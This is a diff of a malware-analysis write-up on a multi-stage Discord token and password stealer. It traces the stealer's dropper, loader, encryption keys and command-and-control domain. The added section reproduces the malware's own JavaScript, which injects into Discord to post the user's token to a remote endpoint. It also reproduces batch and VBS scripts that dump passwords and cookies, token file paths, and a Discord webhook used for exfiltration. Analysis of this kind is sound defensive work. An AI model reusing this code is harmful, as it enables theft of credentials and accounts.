@@ -27,7 +27,7 @@ According to the tool DIE the file is a .NET executable. While still using the t
 [DIE] https://github.com/horsicq/Detect-It-Easy
 [Entropy] https://en.wikipedia.org/wiki/Entropy_(computing)
 
-### Dropper
+### Stage 1 - Dropper
 
 Opening the executable with dnSpy, the original file is called flowers and the function to main is called Loader. Main is unpacking a file from the `exitcollection` resource called `flashinsane.dat`. It's xorring  6144 bytes with key in base64. Then it's loading and executing without writing it to disk. 
 
@@ -67,7 +67,7 @@ strmClose.writeData(addr(buffer), sizeof(buffer))
 strmClose.close()
 ```
 
-### Loader
+### Stage 2 - Loader
 
 Going over the code in dnSpy the loader is parsing out an executable from `Grabber Token Picture.exe` hidden in the `sevendevil` header. The code also has a few configuration options. The configuration is within the base64 string. To make it a bit easier I'll be reusing the dotNET code and changing it a bit around. dotnetFiddle is a great resource for testing short C# code. 
 
@@ -261,7 +261,7 @@ Set the path to `hhhhh.exe`. The **sf** option is for creating its own directory
 
 
 
-### hhhhh.exe
+### Stage 3 - hhhhh.exe
 
 The next executable is another dropper. The dropper is splitting the data between `@hsdhi)_u3-04120uj0-asf@` Which gives the following array back
 
@@ -274,7 +274,9 @@ The data is encrypted with the RC4 password `asjd90AS)(RHJ()!@#$JH)(rsgahs09t091
 
 Interesting observation is the following debug information: `C:\Users\Mirko\Desktop\INFINITY SOURCE\v3!\Stub\fil1x132\obj\Release\m1231!@#asdasdas.pdb`
 
-### Explorer.exe
+### Stage 4 - Explorer.exe
+
+
 
 Binaries configuration
 
@@ -326,16 +328,11 @@ rem gg
 del %0 /f /q
 ```
 
+Drops TrkBtManServ.exe
 
+### Stage 5 - RtkBtManServ.exe
 
-connects and sends data through a discord webhook
-`http://discord.com/api/v6/webhooks/951530422976790528/KWL-_fgp0yDlQyalmDBem11c_C_VmnpsmzTwSeBGRRoUXz40Wa9q_Me_zD6yyxdzLu4J`
-
-
-
-### RtkBtManServ.exe
-
-Drops Nirsoft software for collecting information. From `Explorer.exe`. When the base64 key is used together with `RTkbtManServ.exe` It is trying to connect to `itroublvehacker.gq`. However, the domain does not exist. At time of writing the domain is not registered.
+Drops Nirsoft software for collecting information. From `Explorer.exe`. When the base64 key is used together with `RTkbtManServ.exe` It is trying to connect to `itroublvehacker.gq`. 
 
 `RtkBtManServ.exe" 3DdHBGXJtZaBFfP8HsYgGdL3DLw4WBuf00yKjIbZKNf6jxChJg599sEsND36Da7G/Waa8dzYrEX0/PImVXvuFvGYu0DQCHU8+Zp717y1Wfdd6HmZAvF3ddLoEF+H7rV932JJt5TduuQLzwuPrrTs6ory0pt1ozzD/8FXar83Cpg=`
 
@@ -355,6 +352,127 @@ Nirsoft
 
   
 
-[unpac] unpac.me/results/bd7d7188-71f3-45ea-9572-b005efe8117e
 
+Other observations 
+
+* Checks for IsLogging
+
+* Checks for VirtualProtect
+
+* Checks `SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion` for `DigitalProductId`
+
+* Create a directory files, compress as f.zip and upload to `anonfiles[.]com`
+
+* Copy the following code to the voice module located at `\\modules\\discord_voice\\index.js` of Discord, DiscordCanary, DiscordPTB, DiscordDevelopement. c000015.p000003 is compile.bat or compile.vbs.
+  ```javascript
+  var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C[\"token\"];var O = new XMLHttpRequest();O.open('POST', '" + c000015.p000003 + "', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{\"content\": ' + strtoken + '}');
+  ```
+
+* Creates a screenshot and saves it as a capture.png
+
+* Create compile.bat 
+  ```bash
+  start %temp%\snuvcdsm.exe /stext "%temp%\%username%_Passwords.txt"
+  exit
+  ```
+
+* Create compile.vbs
+  ``` vbscript
+  Dim fso, fName, txt,objshell,UserName,tempfolder
+  Set fso = CreateObject("Scripting.FileSystemObject")
+  Set tempfolder = fso.GetSpecialFolder(2)
+  Set oShell = CreateObject ("Wscript.Shell")
+  Dim strArgs
+  strArgs = "cmd /c compile.bat"
+  oShell.Run strArgs, 0, True
+  ```
+
+* Creates {user}_history.txt with web browser history information and upload it to anonfiles
+
+* Copy cookies created from the Nirsoft cookieviewer software. Depending on the output it has headers as  `Cookies Ex [Mix]:`, `Cookies file is empty.`, `No cookies found!`, saves it as {user}_cookies.txt and upload to anonfiles
+  ```sh
+  start %temp%\\winhlp32.exe /stext \"%temp%\\Cookies1\"
+  start %temp%\\splwow64.exe /stext \"%temp%\\Cookies2\"
+  start %temp%\\hh.exe /stext \"%temp%\\Cookies3\"
+  exit
+  ```
+
+  ```
+  ==================================================
+  Host Name         : .google.com
+  Path              : /
+  Name              : NID
+  Value             : 204=EFhTZlCxp2kRrlMq1FZf2Q3Jb2oRULjnyesclKjVHI9hmzDOEgdJJnK8EFNYB3uZMWZhMTgbUOR2rqfC99iCU-NzuziUpgrGzXo9XkkaJyOXvBvKJ4eFmKztMxgDY9A4tg5tzPQqe3tzkqJYfNzL5Bf94cldrym0Uvc-4g8nhKQ
+  Secure            : Yes
+  HTTP Only         : Yes
+  Last Accessed     : 11/4/2020 3:48:55 AM
+  Created On        : 9/28/2020 6:41:56 AM
+  Expires           : 3/30/2021 6:41:56 AM
+  ==================================================
+  ```
+
+* Copy's passwords collected from the nirsoft software and upload to anonfiles.
+  ```sh
+  start %temp%\\snuvcdsm.exe /stext \"%temp%\\%username%_Passwords.txt\"
+  exit
+  ```
+
+* Creates and uploads data to discord as `username`, `avatar_url` `content`. The picture used for the avatar is called `ss.png`. Content can be password, cookies, history, SystemINFO.txt, screenshot.png
+
+* Trying to read strings from `https://itroublvehacker.gq/bypass_stealer` 
+
+* Creates a unique base64 of the systems MachineGuid, ProcessorID, and Serialnumber
+
+* Search for .log, .ldb, .sqlite
+
+* Send all the detail as Frank to Discord
+  ```json
+  # Example
+  
+  {
+  	"username": "Frank",
+  	"avatar_url": "ss.png",
+  	"content": "Passwords",
+    	"embeds": [
+      {
+        "title": "",
+        "color": 1127128
+      },
+  }
+  ```
+
+* Copy tokens
+  ```
+  \\discord\\Local Storage\\leveldb\\
+  \\Lightcord\\Local Storage\\leveldb\\
+  \\discorddevelopment\\Local Storage\\leveldb\\
+  \\discordcanary\\Local Storage\\leveldb\\
+  \\discordptb\\Local Storage\\leveldb\\
+  \\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\
+  \\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\
+  \\BraveSoftware\\Brave-Browser-Nightly\\User Data\\Default\\Local Storage\\leveldb\\
+  \\Opera Software\\Opera Stable\\Local Storage\\leveldb\\
+  \\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\
+  \\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\
+  \\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\
+  \\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\
+  \\Mozilla\\Firefox\\Profiles\\webappsstore.sqlite
+  ```
+
+* Using Nirsoft to create a screenshot
+  ```sh
+  start %temp%\\bfsvc.exe /capture /Filename \"%temp%\\capture.png\
+  exit
+  ```
+
+* Generates the Discord webhook url 
+  ```
+  http://discord.com/api/v6/webhooks/951530422976790528/KWL-_fgp0yDlQyalmDBem11c_C_VmnpsmzTwSeBGRRoUXz40Wa9q_Me_zD6yyxdzLu4J
+  ```
+
+[Virtualprotect] https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
+[isLogging] https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.debugger.islogging?view=net-6.0
+[unpac] unpac.me/results/bd7d7188-71f3-45ea-9572-b005efe8117e
 [TLD gq] https://en.wikipedia.org/wiki/.gq
+[Discord Webhooks] https://birdie0.github.io/discord-webhooks-guide/index.html
+
